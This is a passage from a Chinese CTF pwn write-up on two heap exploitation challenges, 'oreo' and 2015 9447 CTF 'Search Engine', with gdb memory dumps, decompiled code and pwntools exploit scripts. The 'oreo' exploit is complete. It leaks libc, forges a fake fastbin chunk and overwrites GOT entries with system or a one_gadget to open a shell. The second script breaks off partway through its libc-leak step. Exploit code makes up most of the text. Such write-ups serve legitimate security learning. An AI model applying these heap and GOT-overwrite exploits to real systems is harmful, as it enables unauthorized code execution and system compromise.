    gdb-peda$ x/60wx 0x804a2c0-0x20
    0x804a2a0:  0x00000000  0x00000040  0x0804a2c0  0x00000000
    0x804a2b0:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a2c0:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a2d0:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a2e0:  0x00000040  0x00000100  0x62626262  0x62626262
    0x804a2f0:  0x62626262  0x00000000  0x63636363  0x63636363
    0x804a300:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a310:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a320:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a330:  0x63636363  0x63636363  0x63636363  0x00636363
    0x804a340:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a350:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a360:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a370:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a380:  0x00000000  0x00000000  0x00000000  0x00000000
可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了
### 覆写got表
    payload = p32(elf.got['strlen'])
        payload = payload.ljust(25,'a')
        add('b'*27 + p32(0), payload)
        payload = p32(sys_addr) + ";/bin/sh\x00"
        edit(payload)
        p.interactive()
这里ctf-wiki用的是strlen表， **然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置**
，构造payload为strlen的地址，然后在用edit函数进行编辑
    unsigned int Message()
    {
      unsigned int v0; // ST1C_4
      v0 = __readgsdword(0x14u);
      printf("Enter any notice you'd like to submit with your order: ");
      fgets(dword_804A2A8, 128, stdin);
      sub_80485EC(dword_804A2A8);
      return __readgsdword(0x14u) ^ v0;
    }
edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑
    gdb-peda$ x/60wx 0x804a2a8-0x8
    0x804a2a0:  0x00000001  0x00000041  0x0804a250  0x61616161
    0x804a2b0:  0x61616161  0x61616161  0x61616161  0x61616161
    0x804a2c0:  0x62000061  0x62626262  0x62626262  0x62626262
    0x804a2d0:  0x62626262  0x62626262  0x62626262  0x00000000
    0x804a2e0:  0x0000000a  0x00000100  0x62626262  0x62626262
    0x804a2f0:  0x62626262  0x00000000  0x63636363  0x63636363
    0x804a300:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a310:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a320:  0x63636363  0x63636363  0x63636363  0x63636363
    0x804a330:  0x63636363  0x63636363  0x63636363  0x00636363
    0x804a340:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a350:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a360:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a370:  0x00000000  0x00000000  0x00000000  0x00000000
    0x804a380:  0x00000000  0x00000000  0x00000000  0x00000000
你看，地址变成了0x804a250
    ► 0x80487eb    call   fgets@plt 
            s: 0x804a250 (PI:EMAIL) —▸ 0xf7e3d440 ◂— 0x7c8b5756
            n: 0x80
            stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208
就是got表的地址  
然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00'，经过测试system("abcd;/bin/sh")在c语言里也是可以获得权限的，  
这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)  
也就是相当于system(p32(sys_addr)+";/bin/sh")
并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget
    payload = p32(elf.got['puts'])
        payload = payload.ljust(25,'a')
        add('b'*27 + p32(0), payload)
        one_gadget = libc_base + 0x5fbc5
        payload = p32(one_gadget)
        edit(payload)
        puts()
        p.interactive()
完结，撒花  
完整exp
    #!/usr/bin/env python
    # coding=utf-8
    from PwnContext.core import *
    ctx.binary = 'oreo'
    ctx.remote_libc = 'libc.so.6'
    ctx.debug_remote_libc = True
    elf = ELF('./oreo')
    if ctx.debug_remote_libc == False:
        libc = elf.libc
    else:
        libc = ctx.remote_libc
    local = 1
    if local:
        #context.log_level = 'debug'
        p = ctx.start()
    else:
        p = remote("",10000)
    log.info('PID: ' + str(proc.pidof(p)[0]))
    def add(name, description):
        p.sendline("1")
        p.sendline(name)
        p.sendline(description)
    def show():
        p.sendline("2")
        p.recvuntil("===================================")
    def delete():
        p.sendline("3")
    def edit(payload):
        p.sendline("4")
        p.sendline(payload)
    def puts():
        p.sendline("5")
    if __name__ == '__main__':
        #first leak the libc
        puts_got = elf.got['puts']
        payload = 'a'*27 + p32(puts_got)
        add(payload, 'a'*25)
        show()
        p.recvuntil("===================================")
        p.recvuntil("Description: ")
        result = p.recvuntil("===================================")[:4]
        puts_addr = u32(result)
        log.success("puts_got = {:#x}".format(puts_addr))
        libc_base = puts_addr - libc.symbols['puts']
        sys_addr = libc_base + libc.symbols['system']
        bin_sh = libc_base + libc.search('/bin/sh').next()
        #second fake bin
        i = 1
        while i < 0x3f:
            add('a'*27 + p32(0), 'b'*25)
            i += 1
        payload = 'a'*27 + p32(0x804A2A8)
        add(payload, 'a'*25)
        ### begin fake 
        payload = p8(0)*0x20 + p32(0x40) + p32(0x100)
        payload = payload.ljust(0x34, 'b')
        payload += p32(0)
        payload = payload.ljust(0x80, 'c')
        gdb.attach(p)
        edit(payload)
        delete()
        p.recvuntil('Okay order submitted!\n')
        payload = p32(elf.got['strlen'])
        payload = payload.ljust(25,'a')
        add('b'*27 + p32(0), payload)
        #one_gadget = libc_base + 0x5fbc5
        #payload = p32(one_gadget)
        payload = p32(sys_addr) + ";/bin/sh\x00"
        edit(payload)
        puts()
        p.interactive()
## 2015 9447 CTF : Search Engine
这道题说实话，我连功能怎么使用都不知道。。最后看了wp，也是似懂非懂，不过大概漏洞过程我是理解了的
先利用unsortbin泄露地址  
double free 到malloc_hook  
然后改malloc_hook为one_gadget  
错位部分自己解决
最近学到一个新姿势，double free触发malloc_hook，下一篇写个最近遇到的有趣的题目
其余部分参考ctf-wiki
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'search'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'search'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================a
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    # FORTIFY:  Enabled
    def offset_bin_main_arena(idx):
        word_bytes = context.word_size / 8
        offset = 4  # lock
        offset += 4  # flags
        offset += word_bytes * 10  # offset fastbin
        offset += word_bytes * 2  # top,last_remainder
        offset += idx * 2 * word_bytes  # idx
        offset -= word_bytes * 2  # bin overlap
        return offset
    unsortedbin_offset_main_arena = offset_bin_main_arena(0)
    main_arena_offset = 0x3c4b20
    def index_sentence(s):
        io.recvuntil("3: Quit\n")
        io.sendline('2')
        io.recvuntil("Enter the sentence size:\n")
        io.sendline(str(len(s)))
        io.send(s)
    def search_word(word):
        io.recvuntil("3: Quit\n")
        io.sendline('1')
        io.recvuntil("Enter the word size:\n")
        io.sendline(str(len(word)))
        io.send(word)
    def leak_libc():
        smallbin_sentence = 's' * 0x85 + ' m '
        index_sentence(smallbin_sentence)